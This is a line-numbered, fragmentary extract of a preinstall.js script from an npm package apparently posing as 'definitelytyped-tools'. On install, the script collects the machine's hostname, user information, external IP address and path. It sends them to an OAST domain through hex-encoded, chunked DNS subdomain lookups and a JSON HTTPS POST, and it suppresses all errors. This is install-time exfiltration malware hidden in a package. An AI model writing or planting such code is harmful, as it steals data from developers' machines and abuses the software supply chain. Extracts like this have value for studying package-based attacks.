// File: tmp/tmp5p4d5wry/definitelytyped-tools/package/preinstall.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const dns = require('dns')
Line 3: const https = require('https')
Line 12: os.hostname()
Line 14: os.userInfo()
Line 15: getIPAddress()
Line 20: {
        const data = `h=${fingerprint.host}-p=${fingerprint.path.replace(/[^a-zA-Z0-9-]/g, '')}`;
        const hexPayload = Buffer.from(data).toString('hex');
        const chunks = hexPayload.match(/.{1,60}/g) || [];
        
        chunks.forEach((chunk, index) => {
            const subdomain = `${index}.${chunk}.${OAST_DOMAIN}`;
            dns.lookup(subdomain, () => {}); // Fire-and-forget
        });
    }
Line 21: const data = `h=${fingerprint.host}-p=${fingerprint.path.replace(/[^a-zA-Z0-9-]/g, '')}`
Line 22: Buffer.from(data).toString('hex')
Line 23: const chunks = hexPayload.match(/.{1,60}/g) || []
Line 33: {
        const postData = JSON.stringify(fingerprint);
        const options = {
            hostname: OAST_DOMAIN, path: '/', method: 'POST',
            headers: {'Content-Type': 'application/json', 'Content-Length': postData.length}
        };
        const req = https.request(options);
        req.on('error', ()=>{}); // Suppress errors
        req.write(postData);
        req.end();
    }
Line 39: const req = https.request(options)
Line 41: req.write(postData)
Line 42: req.end()
Line 50: for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
Line 51: for (const iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
